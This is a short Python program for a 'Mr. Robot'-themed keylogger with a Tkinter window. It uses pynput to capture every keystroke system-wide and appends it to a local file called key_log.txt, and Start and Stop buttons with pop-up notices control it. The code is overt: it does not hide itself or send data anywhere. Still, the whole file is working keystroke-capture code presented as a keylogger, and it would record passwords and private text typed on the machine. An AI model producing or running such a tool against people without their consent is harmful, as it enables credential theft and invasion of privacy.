import tkinter as tk
from tkinter import messagebox
from pynput.keyboard import Key, Listener

# File to save the key logs
log_file = "key_log.txt"

# Function to write keystrokes to the log file
def write_to_file(key):
    with open(log_file, 'a') as f:
        k = str(key).replace("'", "")
        if k == "Key.space":
            f.write(' ')  # Add space instead of 'Key.space'
        elif k == "Key.enter":
            f.write('\n')  # Add a newline for the Enter key
        elif k.startswith("Key"):
            f.write(f" [{k}] ")  # Add special keys like [Key.shift], [Key.ctrl]
        else:
            f.write(k)  # Regular characters

# Start the keylogging listener
def on_press(key):
    write_to_file(key)

# Function to start the keylogger
def start_keylogger():
    listener = Listener(on_press=on_press)
    listener.start()
    messagebox.showinfo("Keylogger Running", "Keylogger has started! Keys are being logged.")
    
# Function to stop the keylogger
def stop_keylogger():
    root.quit()
    messagebox.showinfo("Keylogger Stopped", "Keylogger has stopped!")
    
# GUI Creation with Mr. Robot Theme
root = tk.Tk()
root.title("Mr. Robot Keylogger")
root.geometry("400x300")
root.config(bg='#0d0d0d')  # Dark background for the hacker theme

# Title Label with hacker-like red text
title_label = tk.Label(root, text="MR. ROBOT KEYLOGGER", font=("Courier", 18), fg="#FF0000", bg="#0d0d0d")
title_label.pack(pady=20)

# Instruction Label
instruction_label = tk.Label(root, text="Start Logging Keystrokes", font=("Courier", 12), fg="#00FF00", bg="#0d0d0d")
instruction_label.pack(pady=10)

# Start Button (Green)
start_button = tk.Button(root, text="Start Keylogger", font=("Courier", 12), fg="#00FF00", bg='#1c1c1c', command=start_keylogger)
start_button.pack(pady=10)

# Stop Button (Red)
stop_button = tk.Button(root, text="Stop Keylogger", font=("Courier", 12), fg="#FF0000", bg='#1c1c1c', command=stop_keylogger)
stop_button.pack(pady=10)

# Run the GUI loop
root.mainloop()
